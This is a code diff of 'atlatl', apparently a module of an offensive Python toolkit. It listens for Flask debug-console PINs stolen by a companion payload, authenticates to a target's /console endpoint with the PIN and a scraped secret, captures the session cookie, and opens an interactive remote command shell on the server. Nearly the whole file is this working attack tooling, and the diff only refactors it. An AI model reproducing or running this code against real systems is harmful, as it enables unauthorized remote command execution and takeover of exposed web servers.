@@ -1,12 +1,14 @@
+
+from neotermcolor import cprint,colored as cl
 from core.vmnf_payloads import VMNFPayloads
 from random import randint,random,choice
 from requests.utils import requote_uri
-from neotermcolor import colored,cprint
+from datetime import datetime as dt
 from urllib.parse import urlparse
-from res.stage import stager
 from urllib.parse import quote
-from datetime import datetime
 from bs4 import BeautifulSoup
+from res.stage import stager
+from ._atutils import load
 from time import sleep
 import socketserver
 import collections
@@ -14,61 +16,45 @@ import requests
 import sys
 import json
 import os
+import re
+
+
 
 
 class siddhi:
-    module_information = collections.OrderedDict()
-    module_information = {
-        "Name":            "atlatl",
-        "Info":            "Flask Console Hook",
-        "Category":        "Framework",
-        "Framework":       "Flask",
-        "Type":            "persistence",
-        "Module":          "siddhis/atlatl",
-        "Author":          "s4dhu <s4dhul4bs[at]prontonmail[dot]ch",
-        "Brief":           "Flask Console Hook Tool",
-        "Description":
-        """
-
-        \rThis module is intended to act as a specific listener to capture and
-        \rauthenticate Flask debug console sessions, and also act as a stable
-        \rcommunication channel with the affected server. In this first version
-        \ratlatl works in conjunction with the flask_pinstealer payload, but new
-        \rpossibilities are on the way.
-        """
-
-    }
-
     def __init__(self, **vmnf_handler):
         self.vmnf_handler = vmnf_handler
-        self.siddhi_name = colored('4tl4tl','blue')
+        self.siddhi_name = cl('4tl4tl','blue')
 
     class TCPHandler(socketserver.BaseRequestHandler):
         def handle(self):
-            self.siddhi_name = colored('4tl4tl','blue')
-            _set_ = stager(**{'session': False}).check_forward()
             
-            if _set_ is None:
-                print('[{}]➳ Failure!\n'.format(self.siddhi_name))
+            self.siddhi_name = cl('4tl4tl','blue')
+            _set_ = stager(**{'session': False}).check_forward(True)
+            
+            if _set_ in [False, None]:
+                print(f'[{self.siddhi_name}]➳ Failure!\n')
                 sys.exit()
 
             if _set_.get('forward_session').strip() == 'atlatl':
                 _set_ = urlparse(_set_.get('target_url'))
                 target_url = (_set_.scheme + '://' + _set_.netloc)
 
-            self.data = self.request.recv(1024).strip()
-            if 'PIN' in self.data.decode():
-                pin = self.data.decode().split(':')[1].replace("']",'').replace("\\n",'').strip()
-                print('[{}]➳ PIN caught: {}'.format(
-                    self.siddhi_name,colored(pin,'white',attrs=['bold'])
-                    )
-                )
-                sleep(1)
+            self.data = self.request.recv(1024).decode().strip()
+
+            if 'PIN' in self.data:
+                PIN = re.search(".*(\d{3}-\d{3}-\d{3}).*", self.data)
+            
+                if PIN is not None:
+                    PIN = PIN.group(1).strip()
+
+                    print(f"[{self.siddhi_name}]➳ PIN caught: {cl(PIN,'white',attrs=['bold'])}")
+                    sleep(1)
                 
-                # this will be used in future versions
-                #self.request.sendall('blas1'.encode()) 
-                siddhi().console_hook(target_url,pin)
-                setattr(self.server, '_BaseServer__shutdown_request', True)
+                    # this will be used in future versions
+                    # self.request.sendall('blas1'.encode()) 
+                    siddhi().console_hook(target_url, PIN)
+                    setattr(self.server, '_BaseServer__shutdown_request', True)
 
     def get_secret(self,response):
         soup = BeautifulSoup(response.content, 'lxml')
@@ -93,10 +79,12 @@ class siddhi:
             return False
         except requests.exceptions.ConnectionError:
             return False
+        except requests.exceptions.InvalidSchema:
+            return False
     
     def show_cmd_output(self,response):
         if not response:
-            print('[{}]➳ Something went wrong. maybe you ran a weirdo cmd that confused the parser'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}]➳ Something went wrong!')
             return False
 
         if response.status_code == 200:
@@ -107,10 +95,7 @@ class siddhi:
             resp_l = len(cmd_response)
             
             if cmd_response is None:
-                print('[{}]➳ Server response doesnt match with a expected one.'.format(
-                    self.siddhi_name
-                    )
-                )
+                print(f'[{self.siddhi_name}]➳ Server response doesnt match with a expected one.')
                 return False
             
             if resp_l > 1:
@@ -135,9 +120,13 @@ class siddhi:
             print()
             return out_text
 
-    def console_hook(self,target,pin):
-        
-        target_url= "{}/console".format(target)
+    def console_hook(self,target:False, pin:False):
+
+        if not target or not pin:
+            cprint(f'[{self.siddhi_name}]- Missing scope: Run vf guide -m atlatl <--args,--examples>', 'red')
+            return False
+
+        target_url= f"{target}/console"
         auth_part= "?__debugger__=yes&cmd=pinauth&pin={}&s={}"
         cmd_part="?__debugger__=yes&cmd={}&frm=0&s={}"
     
@@ -151,68 +140,69 @@ class siddhi:
             "Referer": target_url
         }
 
-        response = self.request_url(target_url,**headers)
-        
+        try:
+            response = self.request_url(target_url,**headers)
+        except requests.exceptions.InvalidURL:
+            print(f'[{self.siddhi_name}]➳ Invalid URL address!')
+            return False
+
         if not response:
-            print('[{}]➳ Connection failure. Please, check target url and try again'.format(
-                self.siddhi_name
-                )
-            )
+            print(f'[{self.siddhi_name}]➳ Connection failure. Please, check target url and try again')
             return False
 
         secret = self.get_secret(response).strip()
     
         if not secret:
-            print('[{}]➳ Console secret was not found, check target URL'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}]➳ Console secret was not found, check target URL')
             return False
 
         if not pin:
-            print('[{}]➳ Missing console PIN'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}]➳ Missing console PIN')
             return False
 
         auth_url = target_url + auth_part.format(pin,secret)
         response = self.request_url(auth_url,**headers)
     
         if not response:
-            print('[{}]➳ We got some problems during initial steps. Make sure the target and port are correct.'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}]➳ We got some problems during initial steps. Make sure the target and port are correct.')
             sys.exit(1)
 
         if response.status_code == 200:
             try:
                 auth_status = (response.json())
             except json.decoder.JSONDecodeError:
-                print('[{}]➳ An error ocurred during parsing response'.format(self.siddhi_name))
+                print(f'[{self.siddhi_name}]➳ An error ocurred during parsing response')
                 return False
 
             if auth_status.get('auth'):
-                print('[{}]➳ Successfuly authenticated at {}'.format(self.siddhi_name,datetime.now()))
+                print(f'[{self.siddhi_name}]➳ Successfuly authenticated at {dt.now()}')
                 sleep(1)
                 for k,v in (response.headers.items()):
-                    print('     + {}: {}'.format(k,v))
+                    print(f'     + {k}: {v}')
         else:
-            print('[{}]➳ Not authenticated'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}]➳ Not authenticated')
             return False
     
         session_cookie = response.headers.get('Set-Cookie') 
     
         if session_cookie is None:
-            print('[{}] Authentication error: The PIN entered does not seem fresh\n'.format(self.siddhi_name))
+            print(f'[{self.siddhi_name}] Authentication error: The PIN entered does not seem fresh\n')
             return False
 
-        hl_cookie = colored(session_cookie,'white', attrs=['bold'])
-        print('\n[{}]➳ Using cookie {}'.format(self.siddhi_name,hl_cookie))
+        hl_cookie = cl(session_cookie,'white', attrs=['bold'])
+        print(f'\n[{self.siddhi_name}]➳ Using cookie {hl_cookie}')
         sleep(1)
     
         # update headers with set-cookie session
         headers.update({'Cookie':session_cookie})
-        hl_sec = colored(secret,'white', attrs=['bold'])
-        print('[{}]➳ Using secret {}'.format(self.siddhi_name,hl_sec))
+        hl_sec = cl(secret,'white', attrs=['bold'])
+        print(f'[{self.siddhi_name}]➳ Using secret {hl_sec}')
         sleep(1)
         
         id_url = target_url + cmd_part.format(self.get_payload('hostname'),secret)
         response = self.request_url(id_url,**headers)
-        hostname = colored(self.show_cmd_output(response).strip(),'white')
-        atlatl_flag = colored("تیر {}".format(self.siddhi_name),'red') 
+        hostname = cl(self.show_cmd_output(response).strip(),'white')
+        atlatl_flag = cl("تیر {}".format(self.siddhi_name),'red') 
 
         if response:
             dang_cmds = [
@@ -224,10 +214,7 @@ class siddhi:
 
             while True:
                 try:
-                    cmd = input(colored('\n{}@{} ➳ '.format(
-                        atlatl_flag,hostname), 'blue', attrs=[])
-                    )
-
+                    cmd = input(cl(f'\n{atlatl_flag}@{hostname} ➳ ','blue'))
                 except KeyboardInterrupt:
                     continue
                 except EOFError:
@@ -239,7 +226,7 @@ class siddhi:
                     sys.exit(0)
 
                 if [c for c in cmd.split() if c in dang_cmds]:
-                    exp = colored("""
+                    exp = cl("""
                             ,--.!,
                         __/    -*-
                       ,d08b.   '|`
@@ -274,108 +261,57 @@ class siddhi:
             ) 
         )
 
-    def load(self):
-        s='➳ ➵'
-        print('\n\n')
-        for c in range(15):
-            shot = '''\t   ➴  ➶ ➷➹'''*c + s * c 
-            os.system('clear')
-            cprint(shot,choice(
-                ['red','blue','white','yellow','magenta','cyan']),
-                attrs=['blink','bold']
+    def getSocketServer(self, target:False, port:False):
+
+        try:
+            port = int(port)
+        except ValueError:
+            print(f'\n[{elf.siddhi_name}] Invalid port type: {port}\n')
+            return False
+
+        print(f"[{self.siddhi_name}]➳ Listening at {cl(target,'white', attrs=['bold'])} {cl(port, 'white', attrs=['bold'])}...")
+
+        try:
+            with socketserver.TCPServer((target, port), self.TCPHandler) as server:
+                server.serve_forever()
+        except OSError:
+            port = int(input(f'[{self.siddhi_name}]➳ Choose another port to start listener: '))
+            self.getSocketServer(target, port)
+
+    def start(self, port=False):
+        
+        if self.vmnf_handler.get('listener_mode'):
+            self.getSocketServer(
+                self.vmnf_handler.get('local_host'),
+                self.vmnf_handler.get('local_port'),
             )
-            print()
-            sleep(0.07)
-
-    def start(self,port=False):
-        mis_reqs = False
-        hlt = colored('--target-url', 'white')
-        hlp = colored('--console-pin', 'white')
-
-        if not self.vmnf_handler.get("session_mode"):
-            if self.vmnf_handler['local_port']\
-                or self.vmnf_handler['local_port']:
-                
-                cprint("""\n[{}]➳ Parameters such as --local-host or local-port are not necessary in this mode""".format(
-                    self.siddhi_name,
-                    ), 'cyan'
-                ) 
-
-            if not self.vmnf_handler.get('console_pin'):
-                mis_reqs = True
-                hlp = colored('--console-pin', 'red', attrs=['bold'])
-
-            if not self.vmnf_handler.get('target_url'):
-                mis_reqs = True
-                hlt = colored('--target-url', 'red', attrs=['bold'])
             
-            if mis_reqs:
-                cprint("""[{}]➳ In this mode you need to specify {} and {}\n\n""".format(
-                    self.siddhi_name,
-                    hlt, hlp
-                    ), 'cyan'
-                ) 
-
-                sys.exit()
-            
+            return True
+        
+        elif self.vmnf_handler.get('auth_mode'):
             self.console_hook(
                 self.vmnf_handler.get("target_url"),
                 self.vmnf_handler.get("console_pin")
             )
             
-        
-        
-        self.load()
-        os.system('clear')
+            return True
 
-        cprint("""
-             _|      _|              _|      _|
-   _|_|_|  _|_|_|_|  ➵|    _|_|➵|  _|_|_|_|  _| ➵
- ➵|    _|    _|      _|  _|    ➵|    _|      ➵|  ➵
- _|    _|    _|      _|  _|    ➵|    ➵|      _|     ➵ ➵
-   _|_|➵|      _|➵|  _|    _|_|➵|      _|_|  _|
-
-        """,'blue',attrs=['bold'])
-
+        elif self.vmnf_handler.get('session_mode'):
+            self.load()
+    
+            self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
         
-        self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
-        
-        if not self.vmnf_handler:
-            print('[{}] An error occurred while loading session.'.format(
-                self.siddhi_name,call_siddhi
-                )
-            )
-            return False
+            if not self.vmnf_handler:
+                print(f'[{self.siddhi_name}] An error occurred while loading session.')
+                
+                return False
 
-        call_siddhi = colored(self.vmnf_handler.get('module_run'), 'blue')
+            call_siddhi = cl(self.vmnf_handler.get('module_run'), 'blue')
         
-        print('[{}]➳ Loading settings from {} session...'.format(
-            self.siddhi_name,call_siddhi
-            )
-        )
-        sleep(1)
+            print(f'[{self.siddhi_name}]➳ Loading settings from {call_siddhi} session...')
+            sleep(1)
 
-        target = self.vmnf_handler.get('local_host','127.0.0.1')
-        
-        try:
-            port = int(self.vmnf_handler.get('local_port',9000))
-        except ValueError:
-            print('\n[{}] Invalid port type: {}\n'.format(self.siddhi_name,
-                colored(self.vmnf_handler.get('local_port',9000),'red')
-                )
-            )
-            return False
-
-        print('[{}]➳ Listening at {} {}...'.format(
-            self.siddhi_name,
-            colored(target,'white', attrs=['bold']),
-            colored(port, 'white', attrs=['bold'])
-            )
-        )
-        try:
-            with socketserver.TCPServer((target, port), self.TCPHandler) as server:
-                server.serve_forever()
-        except OSError:
-            port = int(input('[{}]➳ Choose another port to start listener: '.format(self.siddhi_name)))
-            self.start(port)
+            target = self.vmnf_handler.get('local_host','127.0.0.1')
+            port = self.vmnf_handler.get('local_port',9000)
+            self.getSocketServer(target, port)
 
